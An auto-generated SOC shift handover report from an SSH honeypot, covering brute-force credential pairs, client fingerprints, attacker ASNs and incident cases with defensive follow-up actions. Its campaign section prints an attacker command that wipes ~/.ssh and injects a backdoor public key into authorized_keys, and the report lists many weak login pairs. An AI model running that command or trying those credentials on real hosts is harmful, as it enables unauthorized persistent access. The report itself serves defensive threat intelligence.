# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-09 |
| **Generated At** | 2026-07-09T10:59:13Z |
| **Shift Time** | 10:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **312** |
| Confirmed Threats | **287** |
| False Positives Filtered | **25** (8.0%) |
| Unique Attacker IPs | **129** |
| Countries of Origin | **37** |
| High Severity Cases | **141** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **171** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **200** |
| Unique Credential Pairs | **101** |
| Unique Usernames | **50** |
| Unique Passwords | **93** |
| Successful Auth Pairs | **171** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `support` | 13 |
| `admin` | 12 |
| `345gs5662d34` | 10 |
| `supervisor` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 9 |
| `support` | 8 |
| `p@ssword` | 6 |
| `` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `support` | `support` | 8 |
| `default` | `p@ssword` | 6 |
| `root` | `` | 6 |
| `ubnt` | `ubnt1234567` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `﻿------fuck------` | `106.12.220.4` | 2026-07-09T06:55:03 |
| `supervisor` | `admin` | `10.0.0.73` | 2026-07-09T06:58:42 |
| `root` | `root123` | `60.173.105.206` | 2026-07-09T07:00:03 |
| `ubuntu` | `Florinlaur2005` | `45.198.224.120` | 2026-07-09T07:01:30 |
| `root` | `root123` | `10.0.0.73` | 2026-07-09T07:03:59 |
| `tracking` | `tracking` | `10.0.0.73` | 2026-07-09T07:05:36 |
| `root` | `123!@#qwe` | `61.80.157.142` | 2026-07-09T07:10:29 |
| `root` | `qwe@12345` | `45.198.224.120` | 2026-07-09T07:12:28 |
| `musikbot` | `musik` | `10.0.0.73` | 2026-07-09T07:16:13 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-09T07:19:41 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-09T07:19:41 |
| `support` | `support` | `176.53.159.196` | 2026-07-09T07:20:09 |
| `support` | `support` | `10.0.0.73` | 2026-07-09T07:21:28 |
| `musikbot` | `musik` | `45.198.224.114` | 2026-07-09T07:23:11 |
| `root` | `Password!@#` | `45.198.224.120` | 2026-07-09T07:23:17 |
| `root` | `root00` | `111.26.184.29` | 2026-07-09T07:29:22 |
| `git` | `git123git` | `45.198.224.120` | 2026-07-09T07:31:39 |
| `alias` | `alias` | `10.0.0.73` | 2026-07-09T07:37:45 |
| `config` | `config5` | `211.22.222.251` | 2026-07-09T07:39:24 |
| `config` | `config5` | `68.225.58.59` | 2026-07-09T07:39:40 |
| `config` | `config5` | `10.0.0.73` | 2026-07-09T07:39:46 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-09T07:43:29 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-09T07:43:29 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-09T07:43:36 |
| `alias` | `alias` | `45.198.224.114` | 2026-07-09T07:44:40 |
| `default` | `p@ssword` | `117.241.77.78` | 2026-07-09T07:46:23 |
| `default` | `p@ssword` | `103.250.160.76` | 2026-07-09T07:46:33 |
| `bascula` | `bascula` | `10.0.0.73` | 2026-07-09T07:48:23 |
| `guest` | `guest1234567890` | `10.0.0.73` | 2026-07-09T07:48:52 |
| `default` | `p@ssword` | `121.189.198.60` | 2026-07-09T07:49:45 |
| `default` | `p@ssword` | `111.70.32.10` | 2026-07-09T07:49:58 |
| `default` | `p@ssword` | `10.0.0.73` | 2026-07-09T07:50:08 |
| `linzhaocheng` | `linzhaocheng` | `45.198.224.120` | 2026-07-09T07:52:06 |
| `root` | `Admin` | `117.216.33.31` | 2026-07-09T07:55:12 |
| `bascula` | `bascula` | `45.198.224.114` | 2026-07-09T07:55:16 |
| `root` | `ubuntu` | `62.106.95.68` | 2026-07-09T07:55:31 |
| `name` | `name` | `103.191.14.210` | 2026-07-09T07:57:27 |
| `345gs5662d34` | `345gs5662d34` | `103.191.14.210` | 2026-07-09T07:57:31 |
| `name` | `3245gs5662d34` | `103.191.14.210` | 2026-07-09T07:57:33 |
| `testing3` | `testing3` | `10.0.0.73` | 2026-07-09T07:59:00 |
| `admin` | `admin66` | `213.230.65.53` | 2026-07-09T08:00:56 |
| `admin` | `admin66` | `218.21.246.238` | 2026-07-09T08:01:06 |
| `nagios` | `Pa55w0rd` | `45.198.224.120` | 2026-07-09T08:03:20 |
| `admin` | `admin66` | `10.0.0.73` | 2026-07-09T08:04:55 |
| `testing3` | `testing3` | `45.198.224.114` | 2026-07-09T08:05:53 |
| `root` | `iptv!@#` | `121.229.9.110` | 2026-07-09T08:08:32 |
| `guest` | `guest0` | `34.146.248.7` | 2026-07-09T08:12:03 |
| `guest` | `guest0` | `124.167.20.72` | 2026-07-09T08:12:13 |
| `support` | `support13` | `220.132.170.64` | 2026-07-09T08:14:07 |
| `root` | `P@ssword1234567890` | `45.198.224.120` | 2026-07-09T08:15:05 |
| `guest` | `guest0` | `121.22.99.2` | 2026-07-09T08:15:37 |
| `cso` | `cso` | `117.34.85.168` | 2026-07-09T08:16:15 |
| `config` | `config8` | `210.4.68.73` | 2026-07-09T08:17:31 |
| `config` | `config8` | `36.137.38.119` | 2026-07-09T08:17:40 |
| `config` | `config8` | `218.248.19.102` | 2026-07-09T08:20:47 |
| `config` | `config8` | `187.8.3.230` | 2026-07-09T08:21:02 |
| `centos` | `centos13` | `31.28.253.144` | 2026-07-09T08:26:02 |
| `yhuang` | `yhuang` | `45.198.224.120` | 2026-07-09T08:26:08 |
| `centos` | `centos13` | `112.184.21.53` | 2026-07-09T08:26:12 |
| `centos` | `centos13` | `220.122.115.9` | 2026-07-09T08:29:32 |
| `centos` | `centos13` | `10.0.0.73` | 2026-07-09T08:30:03 |
| `pool` | `pool` | `10.0.0.73` | 2026-07-09T08:30:53 |
| `sagar` | `123` | `160.174.129.232` | 2026-07-09T08:32:11 |
| `345gs5662d34` | `345gs5662d34` | `160.174.129.232` | 2026-07-09T08:32:13 |
| `sagar` | `3245gs5662d34` | `160.174.129.232` | 2026-07-09T08:32:14 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `216.218.206.67` | 2026-07-09T08:34:53 |
| `nobody` | `nobody12` | `203.110.233.225` | 2026-07-09T08:36:15 |
| `root` | `thomas` | `45.198.224.120` | 2026-07-09T08:36:51 |
| `pool` | `pool` | `45.198.224.114` | 2026-07-09T08:37:44 |
| `daniel` | `daniel` | `191.210.73.33` | 2026-07-09T08:37:50 |
| `confluence1` | `confluence1` | `45.198.224.120` | 2026-07-09T08:47:29 |
| `supervisor` | `p@ssw0rd` | `113.28.86.1` | 2026-07-09T08:51:10 |
| `agathos` | `agathos` | `10.0.0.73` | 2026-07-09T08:52:01 |
| `supervisor` | `p@ssw0rd` | `10.0.0.73` | 2026-07-09T08:55:15 |
| `postgres` | `qwer` | `45.198.224.120` | 2026-07-09T08:58:15 |
| `agathos` | `agathos` | `45.198.224.114` | 2026-07-09T08:58:51 |
| `root` | `Test123!@#` | `167.99.4.252` | 2026-07-09T09:00:41 |
| `345gs5662d34` | `345gs5662d34` | `167.99.4.252` | 2026-07-09T09:00:42 |
| `root` | `3245gs5662d34` | `167.99.4.252` | 2026-07-09T09:00:42 |
| `ts3srv` | `ts3srv` | `10.0.0.73` | 2026-07-09T09:02:38 |
| `operator` | `qwerty123456` | `92.62.74.41` | 2026-07-09T09:03:37 |
| `operator` | `qwerty123456` | `196.216.81.126` | 2026-07-09T09:03:47 |
| `kamera` | `kamera123` | `175.103.54.172` | 2026-07-09T09:03:58 |
| `345gs5662d34` | `345gs5662d34` | `175.103.54.172` | 2026-07-09T09:04:03 |
| `support` | `qwerty1234` | `65.20.138.3` | 2026-07-09T09:05:29 |
| `support` | `qwerty1234` | `223.210.27.53` | 2026-07-09T09:05:39 |
| `support` | `qwerty1234` | `10.0.0.73` | 2026-07-09T09:05:56 |
| `root` | `admin@1` | `45.154.26.147` | 2026-07-09T09:09:07 |
| `345gs5662d34` | `345gs5662d34` | `45.154.26.147` | 2026-07-09T09:09:11 |
| `root` | `3245gs5662d34` | `45.154.26.147` | 2026-07-09T09:09:13 |
| `ts3srv` | `ts3srv` | `45.198.224.114` | 2026-07-09T09:09:30 |
| `root` | `ABC@123` | `45.198.224.120` | 2026-07-09T09:09:35 |
| `deploy` | `test1234` | `203.135.42.52` | 2026-07-09T09:10:46 |
| `345gs5662d34` | `345gs5662d34` | `203.135.42.52` | 2026-07-09T09:10:51 |
| `deploy` | `3245gs5662d34` | `203.135.42.52` | 2026-07-09T09:10:52 |
| `supervisor` | `P@ssw0rd` | `90.228.229.182` | 2026-07-09T09:12:05 |
| `supervisor` | `P@ssw0rd` | `178.183.125.51` | 2026-07-09T09:12:16 |
| `supervisor` | `P@ssw0rd` | `10.0.0.73` | 2026-07-09T09:12:35 |
| `dmdba` | `12345` | `10.0.0.73` | 2026-07-09T09:13:12 |
| `centos` | `centos7` | `34.146.217.105` | 2026-07-09T09:16:32 |
| `a2` | `a2` | `45.198.224.120` | 2026-07-09T09:20:00 |
| `dmdba` | `12345` | `45.198.224.114` | 2026-07-09T09:20:05 |
| `sales` | `sales` | `111.70.32.10` | 2026-07-09T09:27:47 |
| `guest` | `guest00` | `223.210.27.53` | 2026-07-09T09:29:18 |
| `klog` | `klog` | `45.198.224.114` | 2026-07-09T09:30:43 |
| `root` | `123abc` | `45.198.224.120` | 2026-07-09T09:31:08 |
| `sales` | `sales` | `82.193.122.91` | 2026-07-09T09:31:26 |
| `sales` | `sales` | `14.1.65.89` | 2026-07-09T09:31:36 |
| `sales` | `sales` | `10.0.0.73` | 2026-07-09T09:31:52 |
| `guest` | `guest00` | `110.227.215.90` | 2026-07-09T09:32:52 |
| `guest` | `guest00` | `27.107.102.154` | 2026-07-09T09:33:06 |
| `root` | `Aa123` | `10.0.0.73` | 2026-07-09T09:34:25 |
| `admin` | `admin1234` | `191.241.142.170` | 2026-07-09T09:38:04 |
| `admin` | `admin1234` | `10.0.0.73` | 2026-07-09T09:38:22 |
| `ubuntu` | `hadoop1234567` | `45.198.224.120` | 2026-07-09T09:40:45 |
| `root` | `Aa123` | `45.198.224.114` | 2026-07-09T09:41:35 |
| `user` | `user33` | `223.25.108.2` | 2026-07-09T09:42:24 |
| `core` | `core` | `10.0.0.73` | 2026-07-09T09:45:18 |
| `ens` | `123456` | `50.84.211.204` | 2026-07-09T09:45:42 |
| `345gs5662d34` | `345gs5662d34` | `50.84.211.204` | 2026-07-09T09:45:44 |
| `ens` | `3245gs5662d34` | `50.84.211.204` | 2026-07-09T09:45:44 |
| `chen` | `123456` | `10.0.0.73` | 2026-07-09T09:47:30 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-09T09:47:36 |
| `chen` | `3245gs5662d34` | `10.0.0.73` | 2026-07-09T09:47:38 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-09T09:50:40 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-09T09:50:40 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-09T09:50:48 |
| `nagios` | `n@g10s` | `45.198.224.120` | 2026-07-09T09:51:26 |
| `core` | `core` | `45.198.224.114` | 2026-07-09T09:52:12 |
| `admin` | `admin@123` | `14.1.65.89` | 2026-07-09T09:55:02 |
| `admin` | `admin@123` | `178.178.194.136` | 2026-07-09T09:55:10 |
| `blank` | `blank9` | `62.183.82.70` | 2026-07-09T09:56:51 |
| `blank` | `blank9` | `10.0.0.73` | 2026-07-09T09:57:21 |
| `admin` | `admin@123` | `10.0.0.73` | 2026-07-09T09:58:49 |
| `root` | `Abcd1234` | `65.20.131.63` | 2026-07-09T10:00:01 |
| `root` | `admin` | `115.140.161.61` | 2026-07-09T10:00:38 |
| `user` | `user1` | `45.198.224.114` | 2026-07-09T10:02:50 |
| `root` | `admin@12345` | `10.0.0.73` | 2026-07-09T10:06:30 |
| `ubnt` | `ubnt1234567` | `75.80.65.214` | 2026-07-09T10:07:26 |
| `ubnt` | `ubnt1234567` | `88.255.189.44` | 2026-07-09T10:07:39 |
| `root` | `asdfghjkl;'\` | `45.198.224.120` | 2026-07-09T10:08:34 |
| `ubnt` | `ubnt1234567` | `59.93.36.136` | 2026-07-09T10:10:36 |
| `ubnt` | `ubnt1234567` | `200.106.49.149` | 2026-07-09T10:10:44 |
| `ubnt` | `ubnt1234567` | `10.0.0.73` | 2026-07-09T10:10:59 |
| `ftpuser` | `ftpuser12345` | `114.111.52.109` | 2026-07-09T10:12:26 |
| `345gs5662d34` | `345gs5662d34` | `114.111.52.109` | 2026-07-09T10:12:30 |
| `ftpuser` | `3245gs5662d34` | `114.111.52.109` | 2026-07-09T10:12:32 |
| `root` | `P@ssw0rd!123` | `222.232.176.7` | 2026-07-09T10:17:04 |
| `345gs5662d34` | `345gs5662d34` | `222.232.176.7` | 2026-07-09T10:17:07 |
| `root` | `3245gs5662d34` | `222.232.176.7` | 2026-07-09T10:17:09 |
| `fileshare` | `fileshare` | `10.0.0.73` | 2026-07-09T10:17:09 |
| `password` | `password` | `45.198.224.120` | 2026-07-09T10:19:03 |
| `ubnt` | `1234` | `182.76.71.82` | 2026-07-09T10:19:12 |
| `root` | `﻿------fuck------` | `165.232.174.146` | 2026-07-09T10:20:31 |
| `ubnt` | `1234` | `10.0.0.73` | 2026-07-09T10:22:55 |
| `fileshare` | `fileshare` | `45.198.224.114` | 2026-07-09T10:24:00 |
| `admin` | `admin222` | `10.0.0.73` | 2026-07-09T10:24:47 |
| `pi` | `pi` | `117.250.19.91` | 2026-07-09T10:26:03 |
| `pi` | `pi` | `85.105.255.56` | 2026-07-09T10:26:15 |
| `student` | `student` | `10.0.0.73` | 2026-07-09T10:27:44 |
| `pi` | `pi` | `10.0.0.73` | 2026-07-09T10:29:54 |
| `supervisor` | `supervisor12345` | `58.57.154.146` | 2026-07-09T10:32:32 |
| `supervisor` | `supervisor12345` | `200.232.114.71` | 2026-07-09T10:32:43 |
| `student` | `student` | `45.198.224.114` | 2026-07-09T10:34:41 |
| `ubuntu` | `hduser1234` | `45.198.224.120` | 2026-07-09T10:38:16 |
| `centos` | `centos12345` | `45.179.200.156` | 2026-07-09T10:44:42 |
| `centos` | `centos12345` | `191.241.142.170` | 2026-07-09T10:44:51 |
| `centos` | `centos12345` | `195.222.57.183` | 2026-07-09T10:48:15 |
| `zoucl` | `zoucl` | `45.198.224.120` | 2026-07-09T10:48:27 |
| `ftpweb` | `ftpweb123` | `10.0.0.73` | 2026-07-09T10:48:59 |
| `root` | `root77` | `207.219.221.101` | 2026-07-09T10:51:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **312** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 60 |
| Go SSH scanner | 49 |
| libssh | 44 |
| Paramiko (Python) | 12 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 60 | 56 |
| `16443846184e...` | Generic scanner | 35 | 2 |
| `f555226df196...` | Mirai/variant | 28 | 10 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |
| `eff4c24daffc...` | Modern SSH client | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 60 | 56 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 35 | 2 | Generic scanner |
| `f555226df196...` | libssh | 28 | 10 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 3 | 1 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `167.99.4.252`, `114.111.52.109`, `45.154.26.147`, `121.229.9.110`, `103.191.14.210`, `222.232.176.7`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **129** |
| Unique ASNs | **74** |
| High-Risk ASNs | **70** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 12 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 11 | HIGH |
| `AS9829` | National Internet Backbone | 6 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (141)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8e65744851a3

| Field | Detail |
|---|---|
| **Source IP** | `106.12.220[.]4` |
| **First Seen** | 2026-07-09 06:55 |
| **Last Seen** | 2026-07-09 06:55 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 06:55:03` | `cowrie.login.success` |
| `2026-07-09 06:55:10` | `cowrie.session.params` |
| `2026-07-09 06:55:10` | `cowrie.command.input` |
| `2026-07-09 06:55:10` | `cowrie.log.closed` |
| `2026-07-09 06:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.12.220[.]4` to AbuseIPDB if not already reported
- [ ] Block `106.12.220[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a0d914ea5f

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-07-09 06:59 |
| **Last Seen** | 2026-07-09 07:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 06:59:58` | `cowrie.session.connect` |
| `2026-07-09 06:59:59` | `cowrie.client.version` |
| `2026-07-09 06:59:59` | `cowrie.client.kex` |
| `2026-07-09 07:00:03` | `cowrie.login.success` |
| `2026-07-09 07:00:04` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3445e6d4312

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 07:01 |
| **Last Seen** | 2026-07-09 07:01 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:01:23` | `cowrie.session.connect` |
| `2026-07-09 07:01:24` | `cowrie.client.version` |
| `2026-07-09 07:01:24` | `cowrie.client.kex` |
| `2026-07-09 07:01:30` | `cowrie.login.success` |
| `2026-07-09 07:01:33` | `cowrie.session.params` |
| `2026-07-09 07:01:33` | `cowrie.command.input` |
| `2026-07-09 07:01:36` | `cowrie.log.closed` |
| `2026-07-09 07:01:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57e7ab629e38

| Field | Detail |
|---|---|
| **Source IP** | `61.80.157[.]142` |
| **First Seen** | 2026-07-09 07:10 |
| **Last Seen** | 2026-07-09 07:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:10:26` | `cowrie.session.connect` |
| `2026-07-09 07:10:27` | `cowrie.client.version` |
| `2026-07-09 07:10:27` | `cowrie.client.kex` |
| `2026-07-09 07:10:29` | `cowrie.login.success` |
| `2026-07-09 07:10:30` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.80.157[.]142` to AbuseIPDB if not already reported
- [ ] Block `61.80.157[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8880c6eba229

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 07:12 |
| **Last Seen** | 2026-07-09 07:12 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:12:22` | `cowrie.session.connect` |
| `2026-07-09 07:12:23` | `cowrie.client.version` |
| `2026-07-09 07:12:23` | `cowrie.client.kex` |
| `2026-07-09 07:12:28` | `cowrie.login.success` |
| `2026-07-09 07:12:33` | `cowrie.session.params` |
| `2026-07-09 07:12:33` | `cowrie.command.input` |
| `2026-07-09 07:12:34` | `cowrie.log.closed` |
| `2026-07-09 07:12:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02a84679add

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 07:19 |
| **Last Seen** | 2026-07-09 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:19:40` | `cowrie.session.connect` |
| `2026-07-09 07:19:40` | `cowrie.client.version` |
| `2026-07-09 07:19:40` | `cowrie.client.kex` |
| `2026-07-09 07:19:41` | `cowrie.login.success` |
| `2026-07-09 07:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87182eae94d4

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 07:19 |
| **Last Seen** | 2026-07-09 07:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:19:40` | `cowrie.session.connect` |
| `2026-07-09 07:19:40` | `cowrie.client.version` |
| `2026-07-09 07:19:40` | `cowrie.client.kex` |
| `2026-07-09 07:19:41` | `cowrie.login.success` |
| `2026-07-09 07:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd88ee51383

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 07:20 |
| **Last Seen** | 2026-07-09 07:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:20:08` | `cowrie.session.connect` |
| `2026-07-09 07:20:08` | `cowrie.client.version` |
| `2026-07-09 07:20:08` | `cowrie.client.kex` |
| `2026-07-09 07:20:09` | `cowrie.login.success` |
| `2026-07-09 07:20:09` | `cowrie.direct-tcpip.request` |
| `2026-07-09 07:20:09` | `cowrie.direct-tcpip.data` |
| `2026-07-09 07:20:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3107ffa324e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 07:23 |
| **Last Seen** | 2026-07-09 07:23 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:23:10` | `cowrie.session.connect` |
| `2026-07-09 07:23:12` | `cowrie.client.version` |
| `2026-07-09 07:23:12` | `cowrie.client.kex` |
| `2026-07-09 07:23:17` | `cowrie.login.success` |
| `2026-07-09 07:23:21` | `cowrie.session.params` |
| `2026-07-09 07:23:21` | `cowrie.command.input` |
| `2026-07-09 07:23:23` | `cowrie.log.closed` |
| `2026-07-09 07:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3061b354fb00

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-09 07:23 |
| **Last Seen** | 2026-07-09 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 07:23:10` | `cowrie.session.connect` |
| `2026-07-09 07:23:10` | `cowrie.client.version` |
| `2026-07-09 07:23:11` | `cowrie.client.kex` |
| `2026-07-09 07:23:11` | `cowrie.login.success` |
| `2026-07-09 07:23:12` | `cowrie.session.params` |
| `2026-07-09 07:23:12` | `cowrie.command.input` |
| `2026-07-09 07:23:12` | `cowrie.log.closed` |
